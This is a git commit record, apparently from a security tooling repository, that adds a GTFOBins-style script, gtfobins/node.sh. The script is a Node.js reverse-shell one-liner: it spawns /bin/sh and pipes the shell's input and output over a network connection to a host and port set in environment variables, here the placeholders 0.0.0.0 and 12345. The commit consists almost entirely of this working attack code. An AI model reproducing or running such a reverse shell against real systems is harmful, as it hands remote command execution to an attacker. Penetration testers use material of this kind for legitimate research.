e2a164f1c4f65acfedd600ea2bf60c4cc118cda0
montysecurity <jacobcainmontgomery@gmail.com>
2020-10-03 00:10:38 -0500

    initial

---
+++ gtfobins/node.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+export RHOST=0.0.0.0
+export RPORT=12345
+node -e 'sh = require("child_process").spawn("/bin/sh");
+net.connect(process.env.RPORT, process.env.RHOST, function () {
+  this.pipe(sh.stdin);
+  sh.stdout.pipe(this);
+  sh.stderr.pipe(this);
+});'
